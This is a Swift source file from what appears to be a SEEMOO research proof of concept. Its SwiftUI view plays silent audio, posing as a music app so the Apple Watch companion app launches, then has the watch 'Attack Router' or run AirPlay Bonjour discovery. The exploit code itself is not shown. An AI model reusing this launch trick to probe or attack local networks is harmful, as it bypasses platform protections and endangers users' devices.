//
//  AppleWatchPoCView.swift
//  PoC-LanShield
//
//  Created by Alex - SEEMOO on 19.12.24.
//

import SwiftUI
import AVFoundation
import AVKit
import MediaPlayer
import os

import WatchConnectivity

struct AppleWatchPoCView: View {
    
    @State var currentStateLog = ""
    @State var running = false
    
    @State var response: String?
    
    var body: some View {
        VStack {
            // We want the Apple Watch App to launch automatically
            // For this and for low-level access we set ourselves to be a music streaming app
            // We start playing silent audio on the iPhone to launch the Apple Watch App
            
            Text("Start the attack with the button below.")
                .font(.headline)
                .padding(.bottom)
            
            Text("The iOS app will use the Apple Watch companion app to run the exploits.")
            
            Image(systemName: "applewatch")
                .resizable()
                .aspectRatio(contentMode: .fit)
                .frame(width: 150, height: 150, alignment: .center)
                .padding()
            
            HStack {
                Button {
                    startRouter()
                    self.running = true
                } label: {
                    Text("Attack Router")
                }
                .buttonStyle(.borderedProminent)
                
                Button {
                    startDiscovery()
                    self.running = true
                } label: {
                    Text("Discover Devices")
                }
                .buttonStyle(.borderedProminent)
            }
            
            
            
            if running {
                ProgressView()
            }
            
            Text(currentStateLog)
            
            if let response {
                ScrollView {
                    Text(response)
                        .monospaced()
                        .multilineTextAlignment(.leading)
                }
            }
        }
    }
    
    func startRouter() {
        Task {
            do {
                os_log(.debug, "Starting audio playback")
                startPlayingSilentAudio()
                let _ = try await checkWhenWatchAppIsLaunched()
                try await sendCommandRouterToWatch()
            }
        }
    }
    
    func startDiscovery() {
        Task {
            do {
                os_log(.debug, "Starting audio playback")
                startPlayingSilentAudio()
                let _ = try await checkWhenWatchAppIsLaunched()
                try await sendCommandDiscoveryToWatch()
            }
        }
    }
    
    
    func startPlayingSilentAudio() {
        currentStateLog = "Start audio playback"
        let audioFile = Bundle.main.url(forResource: "1-hour-of-silence", withExtension: "mp3")
        let player = AVPlayer(url: audioFile!)
        player.play()
        
        MPNowPlayingInfoCenter.default().nowPlayingInfo = [
//            MPMediaItemPropertyArtwork: UIImage(systemName: "music.note")!,
            MPMediaItemPropertyTitle: "PoC",
            MPMediaItemPropertyArtist: "SEEMOO"
        ]
    }
    
    func checkWhenWatchAppIsLaunched() async throws -> Bool {
        currentStateLog += "\nWaiting for Apple Watch"
        while (WatchController.shared.session.isReachable == false) {
            os_log(.debug, "Checking if watch app is active...")
            try await Task.sleep(for: .seconds(1))
        }
        return true
    }
    
    func sendCommandRouterToWatch() async throws {
        currentStateLog += "\nSending command"
        guard WatchController.shared.session.isReachable else {
            os_log(.debug, "Watch app is not active...")
            return
        }
        
        
        // Wrap the callbacks in an async call
        let reply = try await withCheckedThrowingContinuation { checkedContinuation in
            os_log(.debug, "Sending command to watch...")
            WatchController.shared.session.sendMessage(["command": "router"]) { reply in
                checkedContinuation.resume(returning: reply)
            } errorHandler: { error in
                checkedContinuation.resume(throwing: error)
            }
        }
        
        
        //Print the messages from, the watch
        os_log(.debug, "Done received reply \(reply)")
        self.response = (reply["log"] as? String) ?? ""
        self.running = false
        
    }
    
    func sendCommandDiscoveryToWatch() async throws {
        currentStateLog += "\nSending command"
        guard WatchController.shared.session.isReachable else {
            os_log(.debug, "Watch app is not active...")
            return
        }
        
        
        // Wrap the callbacks in an async call
        let reply = try await withCheckedThrowingContinuation { checkedContinuation in
            os_log(.debug, "Sending command to watch...")
            WatchController.shared.session.sendMessage(["command": "bonjour", "service": "_airplay._tcp"]) { reply in
                checkedContinuation.resume(returning: reply)
            } errorHandler: { error in
                checkedContinuation.resume(throwing: error)
            }
        }
        
        
        //Print the messages from, the watch
        os_log(.debug, "Done received reply \(reply)")
        self.running = false
        self.response = (reply["log"] as? String) ?? ""
        
    }
}

class WatchController: NSObject, WCSessionDelegate {
    static let shared = WatchController()
    
    let session: WCSession
    
    private override init() {
        
        session = WCSession.default

        super.init()
        
        session.delegate = self
        session.activate()
    }
    
    func session(_ session: WCSession, activationDidCompleteWith activationState: WCSessionActivationState, error: (any Error)?) {
        os_log(.debug, "Watch activation state: \(String(describing: activationState))")
    }
    
    func sessionDidBecomeInactive(_ session: WCSession) {
        os_log(.debug, "Session did become inactive")
    }
    
    func sessionDidDeactivate(_ session: WCSession) {
        os_log(.debug, "Session did become inactive")
        self.session.activate()
    }
    
}
